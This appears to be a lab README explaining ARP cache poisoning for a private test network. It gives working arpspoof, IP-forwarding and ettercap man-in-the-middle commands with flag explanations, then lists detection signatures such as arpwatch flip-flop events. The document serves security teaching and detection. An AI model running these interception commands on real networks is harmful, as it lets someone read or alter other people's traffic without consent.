# ARP Spoofing MITM - Attacker Reference Guide

This folder documents standard ARP spoofing commands and theoretical parameters using security testing tools against a designated private network setup.

## 1. Overview of ARP Spoofing
Address Resolution Protocol (ARP) spoofing involves sending spoofed ARP messages onto a local area network. This associates the attacker's MAC address with the IP address of a legitimate target host or gateway. Once associated, the attacker intercepts, modifies, or drops network traffic intended for the target host. This maps to **MITRE ATT&CK T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)**.

## 2. Command Reference

### ARP Spoofing with `arpspoof` (from `dsniff` suite)
Configures the attacker machine to tell the target that the attacker is the default gateway, and to tell the default gateway that the attacker is the target.

```bash
# Terminal 1: Poison target's cache regarding gateway
arpspoof -i eth0 -t 192.168.56.20 192.168.56.1

# Terminal 2: Poison gateway's cache regarding target
arpspoof -i eth0 -t 192.168.56.1 192.168.56.20
```
* **`-i eth0`**: Selects the network interface to use.
* **`-t 192.168.56.20`**: Specifies the target host to poison.
* **`192.168.56.1`**: Specifies the gateway address the attacker wants to spoof.

### IP Forwarding (Required on Attacker for MITM)
Allows the attacker to forward intercepted traffic so the target does not experience sudden loss of network connectivity.
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### ARP Spoofing with `ettercap`
Performs an automated ARP Poisoning attack in text mode.
```bash
ettercap -T -M arp:remote /192.168.56.20// /192.168.56.1//
```
* **`-T`**: Runs in text-only mode.
* **`-M arp:remote`**: Initiates a dynamic ARP poisoning MitM attack against remote connections.

## 3. Network Detection Signatures
* Unsolicited ARP replies sent to the target's MAC address.
* Multiple IP addresses associated with a single MAC address (visible via `arp -a`).
* System log entries from tracking daemons (like `arpwatch`) indicating "flip-flop" or "reassociation" events.
